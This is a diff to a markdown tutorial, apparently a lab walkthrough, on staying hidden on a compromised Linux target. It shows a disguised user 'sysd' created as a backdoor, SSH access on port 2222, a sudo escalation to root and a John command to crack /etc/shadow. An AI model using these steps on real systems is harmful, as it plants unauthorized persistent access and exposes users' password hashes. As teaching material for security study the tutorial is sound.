@@ -45,9 +45,7 @@ To be a "shadow" in the system means to remain as unnoticed as possible. To achi
 
     `adduser --no-create-home sysd`
 
-    Give your secret user a password:
-
-    `passwd sysd`
+    Give your secret user a password
 
     Press enter on each of the next setting to leave them blank.
 
@@ -147,14 +145,20 @@ Exiting the target machine, then access it again through the previously created 
 
 - Access the target throught the backdoor (change the ip address for the one of your target machine).
 
-    `ssh sysd@192.168.6.105 -p 2222`
+    `ssh sysd@192.168.200.105 -p 2222`
 
+     ![13](Images/13.PNG)
 
 - Use sudo to switch to the root user:
 
     `sudo -s`
 
+    ![14](Images/14.PNG)
+
 ---
+
+# Enjoy yourselve (THE END ?)
+
 
 A backdoor has been created. Now that persistence (Command and Control or Maintaining Access) has been accomplished, it is time to move to the next step of the killer chain (Actions on Objective) or to the last stage of engagement (Covering your tracks).
 
@@ -162,3 +166,5 @@ Example:
 Use John to crack the entire /etc/shadow file:
 
 `john /etc//shadow`
+
+![15](Images/15.PNG)
